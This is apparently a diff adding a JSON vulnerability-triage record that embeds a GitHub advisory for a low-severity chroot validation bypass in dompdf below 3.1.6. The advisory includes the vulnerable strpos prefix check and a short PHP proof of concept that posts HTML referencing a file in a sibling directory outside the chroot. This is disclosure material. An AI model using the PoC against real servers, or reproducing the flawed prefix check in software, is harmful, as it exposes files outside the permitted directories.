@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/2460503?v=4\", \"events_url\": \"https://api.github.com/users/vxhex/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/vxhex/followers\", \"following_url\": \"https://api.github.com/users/vxhex/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/vxhex/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/vxhex\", \"id\": 2460503, \"login\": \"vxhex\", \"node_id\": \"MDQ6VXNlcjI0NjA1MDM=\", \"organizations_url\": \"https://api.github.com/users/vxhex/orgs\", \"received_events_url\": \"https://api.github.com/users/vxhex/received_events\", \"repos_url\": \"https://api.github.com/users/vxhex/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/vxhex/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/vxhex/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/vxhex\", \"user_view_type\": \"public\"}}, {\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/12512020?v=4\", \"events_url\": \"https://api.github.com/users/snoopysecurity/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/snoopysecurity/followers\", \"following_url\": \"https://api.github.com/users/snoopysecurity/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/snoopysecurity/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/snoopysecurity\", \"id\": 12512020, \"login\": \"snoopysecurity\", \"node_id\": \"MDQ6VXNlcjEyNTEyMDIw\", \"organizations_url\": \"https://api.github.com/users/snoopysecurity/orgs\", \"received_events_url\": \"https://api.github.com/users/snoopysecurity/received_events\", \"repos_url\": \"https://api.github.com/users/snoopysecurity/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/snoopysecurity/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/snoopysecurity/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/snoopysecurity\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55554\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 2.3, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-20\", \"name\": \"Improper Input Validation\"}, {\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"### Summary\\nThe chroot check for local files uses a prefix string check to enforce chroot boundaries. The simple string comparison it performs allows paths like /var/www/root_secret/file.html when chroot is /var/www/root.\\n\\nThis allows attacker-controlled document paths/resources to bypass intended local file restrictions.\\n\\n### Details\\nThe `validateLocalUri()` method is used to check if a local file is within an allowed chroot directory. After normalization with `realpath()`, this check is performed with a `strpos()` comparison:\\n\\n\\n```\\n    public function validateLocalUri(string $uri)\\n    {\\n        ...\\n        $realfile = realpath(str_replace(\\\"file://\\\", \\\"\\\", $uri));\\n        ...\\n        foreach ($dirs as $chrootPath) {\\n            $chrootPath = realpath($chrootPath);\\n            if ($chrootPath !== false && strpos($realfile, $chrootPath) === 0) {\\n                $chrootValid = true;\\n```\\n\\nDue to the normalization, the `$chrootPath` string does not have a terminating directory separator (`/`) appended. Because of this, the `strpos()` check only validates that `$chrootPath` is a _prefix_ of  `$realfile`. This allows access to folders with similar names that fall outside of the defined chroot restrictions.\\n\\nFor example, a chroot setting of `/var/www/` would be normalized to `/var/www`, removing the trailing `/`. During `strpos()`, a `$chrootPath` of `/var/www` will also match a `$realfile` starting with `/var/www2`, `/var/www-admin`, or `/var/www_backup`, despite these being different directories.\\n\\n### PoC\\n\\nWith a directory structure similar to:\\n\\n```\\n/home/dompdf/\\n  |--> web/\\n        |--> pdf.php\\n        |--> cat0.jpg\\n  |--> web-admin/\\n        |--> cat1.jpg\\n```\\n\\nAnd web-accessible Dompdf functionality similar to the following (poc.html):\\n\\n```\\n<?php\\nrequire 'vendor/autoload.php';\\nuse Dompdf\\\\Dompdf;\\nuse Dompdf\\\\Options;\\n\\n$options = new Options();\\n$options->setChroot(['/home/dompdf/web/']);\\n$dompdf = new Dompdf($options);\\n\\n$dompdf->loadHtml($_POST['html']);\\n$dompdf->render();\\n$dompdf->stream();\\n?>\\n```\\n\\nA malicious actor can exploit the vulnerability with the following script:\\n\\n```\\n$html = <<<HTML\\n<!DOCTYPE html>\\n<html>\\n    <body>\\n        <p>within chroot</p>\\n            <img src=\\\"/home/dompdf/web/cat0.jpg\\\">\\n        <p>outside of chroot</p>\\n            <img src=\\\"/home/dompdf/web-admin/cat1.jpg\\\">\\n    </body>\\n</html>\\nHTML;\\n\\n$url = 'http://example.com/poc.php';\\n$data = ['html' => $html];\\n$headers = [\\\"Content-type: application/x-www-form-urlencoded\\\"];\\n\\n// use key 'http' even if you send the request to https://...\\n$options = [\\n    'http' => [\\n        'header' => $headers,\\n        'method' => 'POST',\\n        'content' => http_build_query($data),\\n        'ignore_errors' => true,\\n    ],\\n];\\n$context = stream_context_create($options);\\n$response = file_get_contents($url, false, $context);\\n```\\n\\nWhen the PDF is generated, both `jpg` files are loaded successfully despite the `cat1.jpg` file being outside of the allowed chroot.\\n\\n### Impact\\nAn attacker that controls a portion of the rendered HTML could leverage this vulnerability to bypass chroot restrictions and access potentially sensitive files from outside of the allowed directories.\", \"ghsa_id\": \"GHSA-wvh6-f5jh-8gw4\", \"github_reviewed_at\": \"2026-07-22T21:06:48Z\", \"html_url\": \"https://github.com/advisories/GHSA-wvh6-f5jh-8gw4\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-wvh6-f5jh-8gw4\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55554\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-22T21:06:48Z\", \"references\": [\"https://github.com/dompdf/dompdf/security/advisories/GHSA-wvh6-f5jh-8gw4\", \"https://github.com/dompdf/dompdf/commit/1b3b61ec4f6962678e56ee8a42920b4f835ab006\", \"https://github.com/dompdf/dompdf/releases/tag/v3.1.6\", \"https://github.com/advisories/GHSA-wvh6-f5jh-8gw4\"], \"repository_advisory_url\": \"https://api.github.com/repos/dompdf/dompdf/security-advisories/GHSA-wvh6-f5jh-8gw4\", \"severity\": \"low\", \"source_code_location\": \"https://github.com/dompdf/dompdf\", \"summary\": \"Dompdf: Chroot Validation Bypass\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-22T21:06:49Z\", \"url\": \"https://api.github.com/advisories/GHSA-wvh6-f5jh-8gw4\", \"vulnerabilities\": [{\"first_patched_version\": \"3.1.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"dompdf/dompdf\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 3.1.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-wvh6-f5jh-8gw4",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "dompdf/dompdf: < 3.1.6"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-55554"
+    ],
+    "cvss_score": 2.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "dompdf/dompdf"
+    ],
+    "remote": true,
+    "vendor_severity": "low"
+  },
+  "first_seen_at": "2026-07-23T19:37:33.990251Z",
+  "provenance": {
+    "content_sha256": "d1175ad81df1ddfc3533a3f6c86e5e717facf7ecb39652c933ed4b2de5071978",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-22T21:06:48Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-wvh6-f5jh-8gw4",
+  "status": "active",
+  "title": "Dompdf: Chroot Validation Bypass",
+  "updated_at": "2026-07-22T21:06:49Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-wvh6-f5jh-8gw4"
+}
